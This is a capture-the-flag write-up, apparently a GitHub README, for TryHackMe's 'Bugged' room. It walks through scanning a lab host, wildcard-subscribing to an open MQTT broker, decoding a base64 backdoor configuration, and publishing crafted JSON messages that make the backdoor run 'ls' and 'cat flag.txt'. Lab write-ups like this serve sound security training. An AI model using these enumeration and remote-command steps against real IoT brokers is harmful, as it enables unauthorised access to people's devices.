# 🐞 TryHackMe — Bugged

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-00A98F?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Category](https://img.shields.io/badge/Category-MQTT%20%7C%20IoT%20%7C%20Enumeration-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)


## 🎯 Overview

Bugged is an Easy-level **TryHackMe room** focused on **IoT security and MQTT enumeration**. The main goal is to investigate an exposed MQTT service, discover hidden communication channels, understand the message format, and ultimately interact with an MQTT-based backdoor.

---



# 🗺️ Attack Methodology

```text
Reconnaissance
      ↓
Port Scanning
      ↓
MQTT Service Identification
      ↓
MQTT Topic Enumeration
      ↓
Discover Interesting Topics
      ↓
Decode Base64 Configuration
      ↓
Identify MQTT Backdoor
      ↓
Understand Message Format
      ↓
Execute CMD Commands
      ↓
Find flag.txt
      ↓
Read flag
```

---

# 1 Reconnaissance

I started with a full TCP port scan to identify all exposed services.
```
nmap -sV -p- 10.49.184.121
```
Result
```
22/tcp    open    ssh
1883/tcp  open    mqtt
```

The most interesting service was MQTT running on port 1883.

<img width="836" height="200" alt="1" src="https://github.com/user-attachments/assets/38bddbe3-6052-4d37-b8f5-5e5d2a4503ea" />

---

# 2 Enumerating the MQTT Service

MQTT is commonly used in IoT environments for communication between devices.

I performed a more detailed scan against port 1883:
```
sudo nmap -p 1883 -sV -sC --script vuln -T4 10.49.184.121
```
The service was identified as:
```
1883/tcp open mosquitto
Mosquitto version 2.0.14
```
The Nmap MQTT script also revealed several MQTT topics and their recent messages.

<img width="878" height="724" alt="2" src="https://github.com/user-attachments/assets/64eb7297-9f02-47a2-bf1f-df202562111d" />

---

# 3 Subscribing to MQTT Topics

Since MQTT uses a publish/subscribe model, I tried subscribing to all available topics using the wildcard topic:
```
mosquitto_sub -h 10.49.184.121 -t "#" -v
```
The output revealed several IoT devices:
```
storage/thermostat
patio/lights
frontdeck/camera
kitchen/toaster
livingroom/speaker
```
**🔎 4 Interesting Observation**
Among the normal IoT topics, some topics contained long Base64-looking strings.

This suggested that there could be hidden configuration information or commands being transmitted through MQTT.

<img width="1250" height="244" alt="3" src="https://github.com/user-attachments/assets/bbe29995-a1e6-4f3c-a8aa-7a7a2aa44c50" />

---

# 5 Discovering the MQTT Backdoor

While monitoring the MQTT traffic, I discovered additional topics that looked unusual:
```
U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub
```
and:
```
XD2rfR9Bez/GqMpRSEobh/TvLQehMgQE/sub
```
The messages appeared to contain Base64-encoded JSON data.

I decoded one of the messages using:
```
echo "<BASE64_DATA>" | base64 --decode
```
The decoded response revealed information about the MQTT backdoor.

The response contained:
```
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": [
    "HELP",
    "CMD",
    "SYS"
  ],
  "pub_topic": "U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMgQE/sub"
}
```

<img width="1246" height="114" alt="4" src="https://github.com/user-attachments/assets/ddbf9b63-39d8-492b-b4e6-ea0817b600ef" />

**🧠 Important Information**
The backdoor supported:
```
HELP
CMD
SYS
```
The CMD command looked particularly interesting because it could potentially allow operating-system commands to be executed.

---

# 6 Testing the MQTT Backdoor

I first tested the discovered publish topic with a simple message:
```
mosquitto_pub -t U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub -h 10.49.184.121 -m "hlo"
```

<img width="1231" height="63" alt="6" src="https://github.com/user-attachments/assets/3f00da54-8cd5-4168-917b-350b2d2f2c50" />

The server returned an error indicating that the message format was invalid.

<img width="1230" height="94" alt="6-2" src="https://github.com/user-attachments/assets/43153d67-a706-4204-b277-2e9c616551b6" />

---

# 7 Understanding the Required Message Format

The error message was useful because it disclosed the expected format.

The server returned:
```
Invalid message format.

Format:
base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```
This means the command needs to be:
```
Constructed as JSON.
Supplied with the discovered backdoor ID.
Base64 encoded.
Published to the MQTT topic.
```
The general structure was:
```
{
  "id": "<backdoor-id>",
  "cmd": "<command>",
  "arg": "<argument>"
}
```

---

# 8 Executing the CMD Command

Since the backdoor supported the CMD command, I created a JSON command to execute:
```
ls
```
The decoded JSON looked like:
```
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "cmd": "CMD",
  "arg": "ls"
}
```
<img width="1051" height="63" alt="7-1" src="https://github.com/user-attachments/assets/a4791e54-ad5e-4f66-a6e9-8d90f27bc070" />

I then Base64 encoded the message and published it:
```
mosquitto_pub -t U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub -h 10.49.184.121 -m "<BASE64_ENCODED_MESSAGE>"
```
<img width="1240" height="68" alt="7-2" src="https://github.com/user-attachments/assets/431911ce-537d-4b65-ae54-5e5e7253147b" />


The MQTT backdoor returned the command output.

<img width="1114" height="54" alt="7-3" src="https://github.com/user-attachments/assets/58542863-9c6c-407d-ab24-58613f45661f" />

The response showed:
```
flag.txt
```
<img width="985" height="62" alt="7-4" src="https://github.com/user-attachments/assets/5e79d8f2-95d1-4c33-b6e5-ce8dc14eacd6" />

This confirmed that the command execution functionality was working.

---

# 9 Reading the Flag

Since flag.txt was discovered, I sent another CMD request with:
```
cat flag.txt
```
The decoded request was:
```
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "cmd": "CMD",
  "arg": "cat flag.txt"
}
```

<img width="1158" height="76" alt="8-1" src="https://github.com/user-attachments/assets/893a82dd-f86b-4f9a-b91a-0d0e87d037a1" />

The encoded command was then published through the MQTT backdoor:
```
mosquitto_pub -t U4vyqNLQtf/OvozmaZyLT/15H9TF6CHg/pub -h 10.49.184.121 -m "<BASE64_ENCODED_MESSAGE>"
```

<img width="1245" height="64" alt="8-2" src="https://github.com/user-attachments/assets/e93b16b6-ba1f-468e-b434-59eb0714e4bf" />

The target returned the command response.

The final response contained the contents of:
```
flag.txt
```

<img width="1248" height="63" alt="8-3" src="https://github.com/user-attachments/assets/ebe3a3cc-add9-42c5-91a3-057805b582c6" />
<img width="1185" height="76" alt="8-4" src="https://github.com/user-attachments/assets/e855cfd4-6300-4feb-94ab-a0abd8568396" />
